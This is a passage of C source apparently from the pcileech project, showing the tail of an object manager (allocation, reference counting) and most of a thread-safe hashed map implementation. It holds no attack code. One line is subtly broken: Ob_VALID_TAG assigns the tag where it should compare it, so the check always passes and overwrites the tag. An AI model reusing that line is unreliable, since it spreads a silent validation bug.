// (specified at Ob_Alloc time). Callbacks may be useful for cleanup tasks
// - such as decreasing reference count of sub-objects contained in the object
// that is to be deallocated.
//
// (c) Ulf Frisk, 2018-2022
// Author: Ulf Frisk, pcileech@frizk.net
//
#include "ob.h"
#include <stdio.h>

#define obprintf_fn(format, ...)        printf("%s: "format, __func__, ##__VA_ARGS__);
#define OB_DEBUG_FOOTER_SIZE            0x20
#define OB_DEBUG_FOOTER_MAGIC           0x001122334455667788

/*
* Allocate a new object manager memory object.
* -- tag = tag of the object to be allocated.
* -- uFlags = flags as given by LocalAlloc.
* -- uBytes = bytes of object (_including_ object headers).
* -- pfnRef_0 = optional callback for cleanup o be called before object is destroyed.
*               (if object has references that should be decremented before destruction).
* -- pfnRef_1 = optional callback for when object reach refcount = 1 (excl. initial).
* -- return = allocated object on success, with refcount = 1, - NULL on fail.
*/
PVOID Ob_Alloc(_In_ DWORD tag, _In_ UINT uFlags, _In_ SIZE_T uBytes, _In_opt_ VOID(*pfnRef_0)(_In_ PVOID pOb), _In_opt_ VOID(*pfnRef_1)(_In_ PVOID pOb))
{
    POB pOb;
    if((uBytes > 0x40000000) || (uBytes < sizeof(OB))) { return NULL; }
    pOb = (POB)LocalAlloc(uFlags, uBytes + OB_DEBUG_FOOTER_SIZE);
    if(!pOb) { return NULL; }
    pOb->_magic = OB_HEADER_MAGIC;
    pOb->_count = 1;
    pOb->_tag = tag;
    pOb->_pfnRef_0 = pfnRef_0;
    pOb->_pfnRef_1 = pfnRef_1;
    pOb->cbData = (DWORD)uBytes - sizeof(OB);
#ifdef OB_DEBUG
    DWORD i, cb = sizeof(OB) + pOb->cbData;
    PBYTE pb = (PBYTE)pOb;
    for(i = 0; i < OB_DEBUG_FOOTER_SIZE; i += 8) {
        *(PQWORD)(pb + cb + i) = OB_DEBUG_FOOTER_MAGIC;
    }
#endif /* OB_DEBUG */
    return pOb;
}

/*
* Increase the reference count of a object manager object.
* -- pOb
* -- return
*/
PVOID Ob_XINCREF(_In_opt_ PVOID pObIn)
{
    POB pOb = (POB)pObIn;
    if(pOb) {
        if(pOb->_magic == OB_HEADER_MAGIC) {
            InterlockedIncrement(&pOb->_count);
            return (POB)pOb;
        } else {
            obprintf_fn("ObCORE: CRITICAL: INCREF OF NON OBJECT MANAGER OBJECT!\n")
        }
    }
    return NULL;
}

/*
* Decrease the reference count of a object manager object. If the reference
* count reaches zero the object will be cleaned up.
* -- pObIn
* -- return = pObIn if pObIn is valid and refcount > 0 after decref.
*/
PVOID Ob_XDECREF(_In_opt_ PVOID pObIn)
{
    POB pOb = (POB)pObIn;
    DWORD c;
    if(pOb) {
        if(pOb->_magic == OB_HEADER_MAGIC) {
            c = InterlockedDecrement(&pOb->_count);
#ifdef OB_DEBUG
            DWORD i, cb = sizeof(OB) + pOb->cbData;
            PBYTE pb = (PBYTE)pOb;
            for(i = 0; i < OB_DEBUG_FOOTER_SIZE; i += 8) {
                if(*(PQWORD)(pb + cb + i) != OB_DEBUG_FOOTER_MAGIC) {
                    obprintf_fn("ObCORE: CRITICAL: FOOTER OVERWRITTEN - MEMORY CORRUPTION? REFCNT: %i TAG: %04X\n", c, pOb->_tag)
                }
            }
#endif /* OB_DEBUG */
            if(c == 0) {
                if(pOb->_pfnRef_0) { pOb->_pfnRef_0(pOb); }
                pOb->_magic = 0;
                LocalFree(pOb);
            } else if((c == 1) && pOb->_pfnRef_1) {
                pOb->_pfnRef_1(pOb);
                return pOb;
            } else {
                return pOb;
            }
        } else {
            obprintf_fn("ObCORE: CRITICAL: DECREF OF NON OBJECT MANAGER OBJECT!\n")
        }
    }
    return NULL;
}

/*
* Decrease the reference count of a object manager object. If the reference
* count reaches zero the object will be cleaned up.
* Also set the incoming pointer to NULL.
* -- ppOb
*/
VOID Ob_XDECREF_NULL(_In_opt_ PVOID *ppOb)
{
    if(ppOb) {
        Ob_DECREF(*ppOb);
        *ppOb = NULL;
    }
}

/*
* Checks if pObIn is a valid object manager object with the specified tag.
* -- pObIn
* -- tag
* -- return
*/
BOOL Ob_VALID_TAG(_In_ PVOID pObIn, _In_ DWORD tag)
{
    POB pOb = (POB)pObIn;
    return pOb && (pOb->_magic == OB_HEADER_MAGIC) && (pOb->_tag = tag);
}

/*
* Create a new object manager data object in which the ObHdr->cbData is equal
* to the number of bytes in the data buffer supplied to this function.
* May also be created with Ob_Alloc with size: sizeof(OB_HDR) + length of data.
* CALLER DECREF: return
* -- pb
* -- cb
* -- return
*/
_Success_(return != NULL)
POB_DATA ObData_New(_In_ PBYTE pb, _In_ DWORD cb)
{
    POB_DATA pObData = NULL;
    if((pObData = Ob_Alloc(OB_TAG_CORE_DATA, 0, sizeof(OB) + cb, NULL, NULL))) {
        memcpy(pObData->pb, pb, cb);
    }
    return pObData;
}

```

`pcileech/ob/ob_map.c`:

```c
// ob_map.c : implementation of object manager hashed map functionality.
//
// The map is a key-value map that may, as an option, contain object manager
// objects in its value field. They key may be user-defined, generated by a
// function or absent. The ObMap may hold a maximum capacity of 0x02000000
// (~32M) entries which are UNIQUE and non-NULL.
//
// The map (ObMap) is thread safe and implement efficient access to the data
// via internal hashing functionality.
// The map (ObMap) guarantees order amongst values unless the ObMap_Remove*
// functions are called - in which order may change and on-going iterations
// of the set with ObMap_Get/ObMap_GetNext may fail.
// The ObMap is an object manager object and must be DECREF'ed when required.
//
// (c) Ulf Frisk, 2019-2022
// Author: Ulf Frisk, pcileech@frizk.net
//
#include "ob.h"

#define OB_MAP_ENTRIES_DIRECTORY    0x100
#define OB_MAP_ENTRIES_TABLE        0x200
#define OB_MAP_ENTRIES_STORE        0x100
#define OB_MAP_IS_VALID(p)          (p && (p->ObHdr._magic == OB_HEADER_MAGIC) && (p->ObHdr._tag == OB_TAG_CORE_MAP))
#define OB_MAP_TABLE_MAX_CAPACITY   OB_MAP_ENTRIES_DIRECTORY * OB_MAP_ENTRIES_TABLE * OB_MAP_ENTRIES_STORE
#define OB_MAP_HASH_FUNCTION(v)     (13 * (v + _rotr16((WORD)v, 9) + _rotr((DWORD)v, 17) + _rotr64(v, 31)))

#define OB_MAP_INDEX_DIRECTORY(i)   ((i >> 17) & (OB_MAP_ENTRIES_DIRECTORY - 1))
#define OB_MAP_INDEX_TABLE(i)       ((i >> 8) & (OB_MAP_ENTRIES_TABLE - 1))
#define OB_MAP_INDEX_STORE(i)       (i & (OB_MAP_ENTRIES_STORE - 1))

typedef struct tdOB_MAP_ENTRY {
    QWORD k;
    union {
        PVOID v;
        QWORD _Filler;
    };
} OB_MAP_ENTRY, *POB_MAP_ENTRY, **PPOB_MAP_ENTRY;

typedef struct tdOB_MAP {
    OB ObHdr;
    SRWLOCK LockSRW;
    DWORD c;
    DWORD cHashMax;
    DWORD cHashGrowThreshold;
    BOOL fLargeMode;
    BOOL fKey;
    BOOL fObjectsOb;
    BOOL fObjectsLocalFree;
    PDWORD pHashMapKey;
    PDWORD pHashMapValue;
    union {
        PPOB_MAP_ENTRY Directory[OB_MAP_ENTRIES_DIRECTORY];
        struct {
            PPOB_MAP_ENTRY _SmallDirectory[1];
            DWORD _SmallHashMap[0x200];
        };
    };
    POB_MAP_ENTRY _SmallTable[1];
    OB_MAP_ENTRY Store00[OB_MAP_ENTRIES_STORE];
} OB_MAP, *POB_MAP;

#define OB_MAP_CALL_SYNCHRONIZED_IMPLEMENTATION_WRITE(pm, RetTp, RetValFail, fn) {      \
    if(!OB_MAP_IS_VALID(pm)) { return RetValFail; }                                     \
    RetTp retVal;                                                                       \
    AcquireSRWLockExclusive(&pm->LockSRW);                                              \
    retVal = fn;                                                                        \
    ReleaseSRWLockExclusive(&pm->LockSRW);                                              \
    return retVal;                                                                      \
}

#define OB_MAP_CALL_SYNCHRONIZED_IMPLEMENTATION_READ(pm, RetTp, RetValFail, fn) {       \
    if(!OB_MAP_IS_VALID(pm)) { return RetValFail; }                                     \
    RetTp retVal;                                                                       \
    AcquireSRWLockShared(&pm->LockSRW);                                                 \
    retVal = fn;                                                                        \
    ReleaseSRWLockShared(&pm->LockSRW);                                                 \
    return retVal;                                                                      \
}

/*
* Ob_DECREF / LocalFree all objects in the map (if required)
* -- pObMap
*/
VOID _ObMap_ObFreeAllObjects(_In_ POB_MAP pObMap)
{
    DWORD i;
    POB_MAP_ENTRY pe;
    if(pObMap->fObjectsOb) {
        for(i = 1; i < pObMap->c; i++) {
            pe = &pObMap->Directory[OB_MAP_INDEX_DIRECTORY(i)][OB_MAP_INDEX_TABLE(i)][OB_MAP_INDEX_STORE(i)];
            Ob_DECREF(pe->v);
        }
    } else if(pObMap->fObjectsLocalFree) {
        for(i = 1; i < pObMap->c; i++) {
            pe = &pObMap->Directory[OB_MAP_INDEX_DIRECTORY(i)][OB_MAP_INDEX_TABLE(i)][OB_MAP_INDEX_STORE(i)];
            LocalFree(pe->v);
        }
    }
}

/*
* Object Map object manager cleanup function to be called when reference
* count reaches zero.
* -- pObMap
*/
VOID _ObMap_ObCloseCallback(_In_ POB_MAP pObMap)
{
    DWORD iDirectory, iTable;
    _ObMap_ObFreeAllObjects(pObMap);
    if(pObMap->fLargeMode) {
        for(iDirectory = 0; iDirectory < OB_MAP_ENTRIES_DIRECTORY; iDirectory++) {
            if(!pObMap->Directory[iDirectory]) { break; }
            for(iTable = 0; iTable < OB_MAP_ENTRIES_TABLE; iTable++) {
                if(!pObMap->Directory[iDirectory][iTable]) { break; }
                if(iDirectory || iTable) {
                    LocalFree(pObMap->Directory[iDirectory][iTable]);
                }
            }
            LocalFree(pObMap->Directory[iDirectory]);
        }
        LocalFree(pObMap->pHashMapValue);
    }
}

POB_MAP_ENTRY _ObMap_GetFromIndex(_In_ POB_MAP pm, _In_ DWORD iEntry)
{
    if(!iEntry || (iEntry >= pm->c)) { return NULL; }
    return &pm->Directory[OB_MAP_INDEX_DIRECTORY(iEntry)][OB_MAP_INDEX_TABLE(iEntry)][OB_MAP_INDEX_STORE(iEntry)];
}

QWORD _ObMap_GetFromEntryIndex(_In_ POB_MAP pm, _In_ BOOL fValueHash, _In_ DWORD iEntry)
{
    POB_MAP_ENTRY pe = _ObMap_GetFromIndex(pm, iEntry);
    return pe ? (fValueHash ? (QWORD)pe->v : pe->k) : 0;
}

VOID _ObMap_SetHashIndex(_In_ POB_MAP pm, _In_ BOOL fValueHash, _In_ DWORD iHash, _In_ DWORD iEntry)
{
    if(fValueHash) {
        pm->pHashMapValue[iHash] = iEntry;
    } else if(pm->fKey) {
        pm->pHashMapKey[iHash] = iEntry;
    }
}

VOID _ObMap_InsertHash(_In_ POB_MAP pm, _In_ BOOL fValueHash, _In_ DWORD iEntry)
{
    QWORD qwValueToHash;
    DWORD iHash, dwHashMask = pm->cHashMax - 1;
    if(!fValueHash && !pm->fKey) { return; }
    qwValueToHash = _ObMap_GetFromEntryIndex(pm, fValueHash, iEntry);
    iHash = OB_MAP_HASH_FUNCTION(qwValueToHash) & dwHashMask;
    while(fValueHash ? pm->pHashMapValue[iHash] : pm->pHashMapKey[iHash]) {
        iHash = (iHash + 1) & dwHashMask;
    }
    _ObMap_SetHashIndex(pm, fValueHash, iHash, iEntry);
}

VOID _ObMap_RemoveHash(_In_ POB_MAP pm, _In_ BOOL fValueHash, _In_ QWORD kv, _In_ DWORD iEntry)
{
    DWORD iHash, dwHashMask = pm->cHashMax - 1;
    DWORD iNextHash, iNextEntry, iNextHashPreferred;
    QWORD qwNextEntry;
    if(!fValueHash && !pm->fKey) { return; }
    // search for hash index and clear
    iHash = OB_MAP_HASH_FUNCTION(kv) & dwHashMask;
    while(TRUE) {
        if(iEntry == (fValueHash ? pm->pHashMapValue[iHash] : pm->pHashMapKey[iHash])) { break; }
        iHash = (iHash + 1) & dwHashMask;
    }
    _ObMap_SetHashIndex(pm, fValueHash, iHash, 0);
    // re-hash any entries following (value)
    iNextHash = iHash;
    while(TRUE) {
        iNextHash = (iNextHash + 1) & dwHashMask;
        iNextEntry = fValueHash ? pm->pHashMapValue[iNextHash] : pm->pHashMapKey[iNextHash];
        if(0 == iNextEntry) { return; }
        qwNextEntry = _ObMap_GetFromEntryIndex(pm, fValueHash, iNextEntry);
        iNextHashPreferred = OB_MAP_HASH_FUNCTION(qwNextEntry) & dwHashMask;
        if(iNextHash == iNextHashPreferred) { continue; }
        _ObMap_SetHashIndex(pm, fValueHash, iNextHash, 0);
        _ObMap_InsertHash(pm, fValueHash, iNextEntry);
    }
}

_Success_(return)
BOOL _ObMap_GetEntryIndexFromKeyOrValue(_In_ POB_MAP pm, _In_ BOOL fValueHash, _In_ QWORD kv, _Out_opt_ PDWORD piEntry)
{
    DWORD iEntry;
    DWORD dwHashMask = pm->cHashMax - 1;
    DWORD iHash = OB_MAP_HASH_FUNCTION(kv) & dwHashMask;
    if(!fValueHash && !pm->fKey) { return FALSE; }
    // scan hash table to find entry
    while(TRUE) {
        iEntry = fValueHash ? pm->pHashMapValue[iHash] : pm->pHashMapKey[iHash];
        if(0 == iEntry) { return FALSE; }
        if(kv == _ObMap_GetFromEntryIndex(pm, fValueHash, iEntry)) {
            if(piEntry) { *piEntry = iEntry; }
            return TRUE;
        }
        iHash = (iHash + 1) & dwHashMask;
    }
}

//-----------------------------------------------------------------------------
// RETRIEVE/GET FUNCTIONALITY BELOW:
// ObMap_Size,   ObMap_Exists,  ObMap_ExistsKey, ObMap_GetByIndex,
// ObMap_Peek,   ObMap_PeekKey, ObMap_GetByKey,  ObMap_GetNext, 
// ObMap_GetKey, 
//-----------------------------------------------------------------------------

BOOL _ObMap_Exists(_In_ POB_MAP pm, _In_ BOOL fValueHash, _In_ QWORD kv)
{
    if((!fValueHash && !pm->fKey) || (fValueHash && !kv)) { return FALSE; }
    return _ObMap_GetEntryIndexFromKeyOrValue(pm, fValueHash, kv, NULL);
}

/*
* Retrieve the number of objects in the ObMap.
* -- pm
* -- return
*/
DWORD ObMap_Size(_In_opt_ POB_MAP pm)
{
    OB_MAP_CALL_SYNCHRONIZED_IMPLEMENTATION_READ(pm, DWORD, 0, pm->c - 1)
}

/*
* Check if an object exists in the ObMap.
* -- pm
* -- qwKey/pvObject
* -- return
*/
BOOL ObMap_Exists(_In_opt_ POB_MAP pm, _In_ PVOID pvObject)
{
    OB_MAP_CALL_SYNCHRONIZED_IMPLEMENTATION_READ(pm, BOOL, FALSE, _ObMap_Exists(pm, TRUE, (QWORD)pvObject))
}

/*
* Check if a key exists in the ObMap.
* -- pm
* -- qwKey/pvObject
* -- return
*/
BOOL ObMap_ExistsKey(_In_opt_ POB_MAP pm, _In_ QWORD qwKey)
{
    OB_MAP_CALL_SYNCHRONIZED_IMPLEMENTATION_READ(pm, BOOL, FALSE, _ObMap_Exists(pm, FALSE, qwKey))
}

PVOID _ObMap_GetByEntryIndex(_In_ POB_MAP pm, _In_ DWORD iEntry)
{
    PVOID pvObObject = (PVOID)_ObMap_GetFromEntryIndex(pm, TRUE, iEntry);
    if(pm->fObjectsOb) { Ob_INCREF(pvObObject); }
    return pvObObject;
}

PVOID _ObMap_GetByKey(_In_ POB_MAP pm, _In_ QWORD qwKey)
{
    DWORD iEntry;
    return _ObMap_GetEntryIndexFromKeyOrValue(pm, FALSE, qwKey, &iEntry) ? _ObMap_GetByEntryIndex(pm, iEntry) : NULL;
}

PVOID _ObMap_GetNext(_In_ POB_MAP pm, _In_opt_ PVOID pvObject)
{
    DWORD iEntry;
    if(!pvObject) {
        return _ObMap_GetByEntryIndex(pm, 1);
    }
    if(pm->fObjectsOb) { Ob_DECREF(pvObject); }
    if(!_ObMap_GetEntryIndexFromKeyOrValue(pm, TRUE, (QWORD)pvObject, &iEntry)) { return NULL; }
    return _ObMap_GetByEntryIndex(pm, iEntry + 1);
}

PVOID _ObMap_GetNextByKey(_In_ POB_MAP pm, _In_ QWORD qwKey, _In_opt_ PVOID pvObject)
{
    DWORD iEntry;
    if(!pvObject) {
        return _ObMap_GetByEntryIndex(pm, 1);
    }
    if(pm->fObjectsOb) { Ob_DECREF(pvObject); }
    if(!_ObMap_GetEntryIndexFromKeyOrValue(pm, FALSE, qwKey, &iEntry)) { return NULL; }
    return _ObMap_GetByEntryIndex(pm, iEntry + 1);
}

_Success_(return != 0)
QWORD _ObMap_GetKey(_In_ POB_MAP pm, _In_ PVOID pvObject)
{
    DWORD iEntry;
    if(!_ObMap_GetEntryIndexFromKeyOrValue(pm, TRUE, (QWORD)pvObject, &iEntry)) { return 0; }
    return _ObMap_GetFromIndex(pm, iEntry)->k;
}

_Success_(return)
BOOL _ObMap_Filter(_In_ POB_MAP pm, _Inout_opt_ PVOID ctx, _In_ VOID(*pfnFilter)(_In_ QWORD k, _In_ PVOID v, _Inout_opt_ PVOID ctx))
{
    DWORD iEntry;
    POB_MAP_ENTRY pEntry;
    for(iEntry = 1; iEntry < pm->c; iEntry++) {
        pEntry = &pm->Directory[OB_MAP_INDEX_DIRECTORY(iEntry)][OB_MAP_INDEX_TABLE(iEntry)][OB_MAP_INDEX_STORE(iEntry)];
        pfnFilter(pEntry->k, pEntry->v, ctx);
    }
    return TRUE;
}

_Success_(return != NULL)
POB_SET _ObMap_FilterSet(_In_ POB_MAP pm, _In_opt_ VOID(*pfnFilter)(_In_ QWORD k, _In_ PVOID v, _Inout_ POB_SET ps))
{
    DWORD iEntry;
    POB_MAP_ENTRY pEntry;
    POB_SET pObSet;
    if(!(pObSet = ObSet_New())) { return NULL; }
    if(!pfnFilter) { return pObSet; }
    for(iEntry = 1; iEntry < pm->c; iEntry++) {
        pEntry = &pm->Directory[OB_MAP_INDEX_DIRECTORY(iEntry)][OB_MAP_INDEX_TABLE(iEntry)][OB_MAP_INDEX_STORE(iEntry)];
        pfnFilter(pEntry->k, pEntry->v, pObSet);
    }
    return pObSet;
}

/*
* Retrieve an object given an index (which is less than the amount of items
* in the ObMap).
* NB! Correctness of the Get/GetNext functionality is _NOT- guaranteed if the
* ObMap_Remove* functions are called while iterating over the ObSet - items
* may be skipped or iterated over multiple times!
* CALLER DECREF(if OB): return
* -- pm
* -- index
* -- return
*/
PVOID ObMap_GetByIndex(_In_opt_ POB_MAP pm, _In_ DWORD index)
{
    OB_MAP_CALL_SYNCHRONIZED_IMPLEMENTATION_READ(pm, PVOID, NULL, _ObMap_GetByEntryIndex(pm, index + 1))  // (+1 == account/adjust for index 0 (reserved))
}

/*
* Retrieve a value given a key.
* CALLER DECREF(if OB): return
* -- pm
* -- qwKey
* -- return
*/
PVOID ObMap_GetByKey(_In_opt_ POB_MAP pm, _In_ QWORD qwKey)
{
    OB_MAP_CALL_SYNCHRONIZED_IMPLEMENTATION_READ(pm, PVOID, NULL, _ObMap_GetByKey(pm, qwKey))
}

/*
* Retrieve the next object given an object. Start and end objects are NULL.
* NB! Correctness of the Get/GetNext functionality is _NOT_ guaranteed if the
* ObMap_Remove* functions are called while iterating over the ObMap - items may
* be skipped or iterated over multiple times!
* FUNCTION DECREF(if OB): pvObject
* CALLER DECREF(if OB): return
* -- pm
* -- pvObject
* -- return
*/
PVOID ObMap_GetNext(_In_opt_ POB_MAP pm, _In_opt_ PVOID pvObject)
{
    OB_MAP_CALL_SYNCHRONIZED_IMPLEMENTATION_READ(pm, PVOID, NULL, _ObMap_GetNext(pm, pvObject))
}

/*
* Retrieve the next object given a key. To start iterating supply NULL in the
* pvObject parameter (this overrides qwKey). When no more objects are found
* NULL will be returned. This function may ideally be used when object maps
* may be refreshed between function calls. Key may be more stable than object.
* NB! Correctness of the Get/GetNext functionality is _NOT_ guaranteed if the
* ObMap_Remove* functions are called while iterating over the ObMap - items may
* be skipped or iterated over multiple times!
* FUNCTION DECREF(if OB): pvObject
* CALLER DECREF(if OB): return
* -- pm
* -- qwKey
* -- pvObject
* -- return
*/
PVOID ObMap_GetNextByKey(_In_opt_ POB_MAP pm, _In_ QWORD qwKey, _In_opt_ PVOID pvObject)
{
    OB_MAP_CALL_SYNCHRONIZED_IMPLEMENTATION_READ(pm, PVOID, NULL, _ObMap_GetNextByKey(pm, qwKey, pvObject))
}

/*
* Retrieve the key for an existing object in the ObMap.
* -- pm
* -- pvObject
* -- return
*/
_Success_(return != 0)
QWORD ObMap_GetKey(_In_opt_ POB_MAP pm, _In_ PVOID pvObject)
{
    OB_MAP_CALL_SYNCHRONIZED_IMPLEMENTATION_READ(pm, QWORD, 0, _ObMap_GetKey(pm, pvObject))
}

/*
* Peek the "last" object.
* CALLER DECREF(if OB): return
* -- pm
* -- return = success: object, fail: NULL.
*/
PVOID ObMap_Peek(_In_opt_ POB_MAP pm)
{
    OB_MAP_CALL_SYNCHRONIZED_IMPLEMENTATION_READ(pm, PVOID, NULL, _ObMap_GetByEntryIndex(pm, pm->c - 1))
}

/*
* Peek the key of the "last" object.
* -- pm
* -- return = the key, otherwise 0.
*/
QWORD ObMap_PeekKey(_In_opt_ POB_MAP pm)
{
    OB_MAP_CALL_SYNCHRONIZED_IMPLEMENTATION_READ(pm, QWORD, 0, _ObMap_GetFromEntryIndex(pm, FALSE, pm->c - 1))
}

/*
* Filter map objects into a generic context by using a user-supplied filter function.
* -- pm
* -- ctx = optional context to pass on to the filter function.
* -- pfnFilter
* -- return
*/
_Success_(return)
BOOL ObMap_Filter(_In_opt_ POB_MAP pm, _Inout_opt_ PVOID ctx, _In_opt_ VOID(*pfnFilter)(_In_ QWORD k, _In_ PVOID v, _Inout_opt_ PVOID ctx))
{
    if(!pfnFilter) { return FALSE; }
    OB_MAP_CALL_SYNCHRONIZED_IMPLEMENTATION_READ(pm, BOOL, FALSE, _ObMap_Filter(pm, ctx, pfnFilter));
}

/*
* Filter map objects into a POB_SET by using a user-supplied filter function.
* CALLER DECREF: return
* -- pm
* -- pfnFilter
* -- return = POB_SET consisting of values gathered by the pfnFilter function.
*/
_Success_(return != NULL)
POB_SET ObMap_FilterSet(_In_opt_ POB_MAP pm, _In_opt_ VOID(*pfnFilter)(_In_ QWORD k, _In_ PVOID v, _Inout_ POB_SET ps))
{
    OB_MAP_CALL_SYNCHRONIZED_IMPLEMENTATION_READ(pm, POB_SET, NULL, _ObMap_FilterSet(pm, pfnFilter));
}

/*
* Common filter function related to ObMap_FilterSet.
*/
VOID ObMap_FilterSet_FilterAllKey(_In_ QWORD k, _In_ PVOID v, _Inout_ POB_SET ps)
{
    ObSet_Push(ps, k);
}



//-----------------------------------------------------------------------------
// REMOVAL FUNCTIONALITY BELOW:
// ObMap_Pop, ObMap_Remove, ObMap_RemoveByKey, ObMap_RemoveByFilter
//-----------------------------------------------------------------------------

/*
* CALLER DECREF: return
*/
_Success_(return != NULL)
PVOID _ObMap_RetrieveAndRemoveByEntryIndex(_In_ POB_MAP pm, _In_ DWORD iEntry, _Out_opt_ PQWORD pKey)
{
    POB_MAP_ENTRY pRemoveEntry, pLastEntry;
    QWORD qwRemoveKey, qwRemoveValue;
    if(!(pRemoveEntry = _ObMap_GetFromIndex(pm, iEntry))) { return NULL; }
    qwRemoveKey = pRemoveEntry->k;
    qwRemoveValue = (QWORD)pRemoveEntry->v;
    _ObMap_RemoveHash(pm, FALSE, qwRemoveKey, iEntry);
    _ObMap_RemoveHash(pm, TRUE,  qwRemoveValue, iEntry);
    if(iEntry < pm->c - 1) {
        // not last item removed -> move last item into empty bucket
        pLastEntry = _ObMap_GetFromIndex(pm, pm->c - 1);
        _ObMap_RemoveHash(pm, FALSE, pLastEntry->k, pm->c - 1);
        _ObMap_RemoveHash(pm, TRUE, (QWORD)pLastEntry->v, pm->c - 1);
        pRemoveEntry->k = pLastEntry->k;
        pRemoveEntry->v = pLastEntry->v;
        _ObMap_InsertHash(pm, FALSE, iEntry);
        _ObMap_InsertHash(pm, TRUE, iEntry);
    }
    pm->c--;
    if(pKey) { *pKey = qwRemoveKey; }
    return (PVOID)qwRemoveValue;
}

PVOID _ObMap_RemoveOrRemoveByKey(_In_ POB_MAP pm, _In_ BOOL fValueHash, _In_ QWORD kv)
{
    DWORD iEntry;
    if(fValueHash && !kv) { return NULL; }
    if(!_ObMap_GetEntryIndexFromKeyOrValue(pm, fValueHash, kv, &iEntry)) { return NULL; }
    return _ObMap_RetrieveAndRemoveByEntryIndex(pm, iEntry, NULL);
}

DWORD _ObMap_RemoveByFilter(_In_ POB_MAP pm, _In_opt_ BOOL(*pfnFilter)(_In_ QWORD k, _In_ PVOID v))
{
    DWORD cRemove = 0;
    DWORD iEntry;
    PVOID pv;
    POB_MAP_ENTRY pEntry;
    if(!pfnFilter) { return 0; }
    for(iEntry = pm->c - 1; iEntry; iEntry--) {
        pEntry = &pm->Directory[OB_MAP_INDEX_DIRECTORY(iEntry)][OB_MAP_INDEX_TABLE(iEntry)][OB_MAP_INDEX_STORE(iEntry)];
        if(pfnFilter(pEntry->k, pEntry->v)) {
            cRemove++;
            pv = _ObMap_RetrieveAndRemoveByEntryIndex(pm, iEntry, NULL);
            if(pm->fObjectsOb) { Ob_DECREF(pv); }
            if(pm->fObjectsLocalFree) { LocalFree(pv); }
        }
    }
    return cRemove;
}

/*
* Remove the "last" object.
* CALLER DECREF(if OB): return
* -- pm
* -- return = success: object, fail: NULL.
*/
_Success_(return != NULL)
PVOID ObMap_Pop(_In_opt_ POB_MAP pm)
{
    OB_MAP_CALL_SYNCHRONIZED_IMPLEMENTATION_WRITE(pm, PVOID, NULL, _ObMap_RetrieveAndRemoveByEntryIndex(pm, pm->c - 1, NULL))
}

/*
* Remove the "last" object and return it and its key.
* CALLER DECREF(if OB): return
* -- pm
* -- pKey
* -- return = success: object, fail: NULL.
*/
_Success_(return != NULL)
PVOID ObMap_PopWithKey(_In_opt_ POB_MAP pm, _Out_ PQWORD pKey)
{
    OB_MAP_CALL_SYNCHRONIZED_IMPLEMENTATION_WRITE(pm, PVOID, NULL, _ObMap_RetrieveAndRemoveByEntryIndex(pm, pm->c - 1, pKey))
}

/*
* Remove an object from the ObMap.
* NB! must not be called simultaneously while iterating with ObMap_GetByIndex/ObMap_GetNext.
* -- pm
* -- value
* -- return = success: object, fail: NULL.
*/
PVOID ObMap_Remove(_In_opt_ POB_MAP pm, _In_ PVOID pvObject)
{
    OB_MAP_CALL_SYNCHRONIZED_IMPLEMENTATION_WRITE(pm, PVOID, NULL, _ObMap_RemoveOrRemoveByKey(pm, TRUE, (QWORD)pvObject))
}

/*
* Remove an object from the ObMap by using its key.
* NB! must not be called simultaneously while iterating with ObMap_GetByIndex/ObMap_GetNext.
* CALLER DECREF(if OB): return
* -- pm
* -- qwKey
* -- return = success: object, fail: NULL.
*/
PVOID ObMap_RemoveByKey(_In_opt_ POB_MAP pm, _In_ QWORD qwKey)
{
    OB_MAP_CALL_SYNCHRONIZED_IMPLEMENTATION_WRITE(pm, PVOID, NULL, _ObMap_RemoveOrRemoveByKey(pm, FALSE, qwKey))
}

/*
* Remove map objects using a user-supplied filter function.
* -- pm
* -- pfnFilter = decision making function, TRUE = keep, FALSE = remove.
* -- return = number of entries removed.
*/
DWORD ObMap_RemoveByFilter(_In_opt_ POB_MAP pm, _In_opt_ BOOL(*pfnFilter)(_In_ QWORD k, _In_ PVOID v))
{
    OB_MAP_CALL_SYNCHRONIZED_IMPLEMENTATION_WRITE(pm, DWORD, 0, _ObMap_RemoveByFilter(pm, pfnFilter));
}

/*
* Clear the ObMap by removing all objects and their keys.
* NB! underlying allocated memory will remain unchanged.
* -- pm
* -- return = clear was successful - always true.
*/
_Success_(return)
BOOL ObMap_Clear(_In_opt_ POB_MAP pm)
{
    if(!OB_MAP_IS_VALID(pm) || (pm->c <= 1)) { return TRUE; }
    AcquireSRWLockExclusive(&pm->LockSRW);
    if(pm->c <= 1) {
        ReleaseSRWLockExclusive(&pm->LockSRW);
        return TRUE;
    }
    _ObMap_ObFreeAllObjects(pm);
    ZeroMemory(pm->pHashMapValue, 4ULL * pm->cHashMax);
    if(pm->pHashMapKey) { ZeroMemory(pm->pHashMapKey, 4ULL * pm->cHashMax); }
    pm->c = 1;  // item zero is reserved - hence the initialization of count to 1
    ReleaseSRWLockExclusive(&pm->LockSRW);
    return TRUE;
}



//-----------------------------------------------------------------------------
// CREATE / INSERT FUNCTIONALITY BELOW:
// ObMap_New, ObMap_Push
//-----------------------------------------------------------------------------

/*
* Grow the Tables for hash lookups by a factor of *2.
* -- pvs
* -- pm
*/
_Success_(return)
BOOL _ObMap_Grow(_In_ POB_MAP pm)
{
    DWORD iEntry;
    PDWORD pdwNewAllocHashMap;
    if(!(pdwNewAllocHashMap = LocalAlloc(LMEM_ZEROINIT, 2 * sizeof(DWORD) * pm->cHashMax * (pm->fKey ? 2 : 1)))) { return FALSE; }
    if(!pm->fLargeMode) {
        if(!(pm->Directory[0] = LocalAlloc(LMEM_ZEROINIT, sizeof(POB_MAP_ENTRY) * OB_MAP_ENTRIES_TABLE))) { return FALSE; }
        pm->Directory[0][0] = pm->Store00;
        ZeroMemory(pm->_SmallHashMap, sizeof(pm->_SmallHashMap));
        pm->pHashMapKey = NULL;
        pm->pHashMapValue = NULL;
        pm->fLargeMode = TRUE;
    }
    pm->cHashMax *= 2;
    pm->cHashGrowThreshold *= 2;
    LocalFree(pm->pHashMapValue);
    pm->pHashMapValue = pdwNewAllocHashMap;
    if(pm->fKey) {
        pm->pHashMapKey = pm->pHashMapValue + pm->cHashMax;
    }
    for(iEntry = 1; iEntry < pm->c; iEntry++) {
        _ObMap_InsertHash(pm, TRUE, iEntry);
        _ObMap_InsertHash(pm, FALSE, iEntry);
    }
    return TRUE;
}

_Success_(return)
BOOL _ObMap_Push(_In_ POB_MAP pm, _In_ QWORD qwKey, _In_ PVOID pvObject)
{
    POB_MAP_ENTRY pe;
    DWORD iEntry = pm->c;
    if(!pvObject || _ObMap_Exists(pm, TRUE, (QWORD)pvObject) || _ObMap_Exists(pm, FALSE, qwKey)) { return FALSE; }
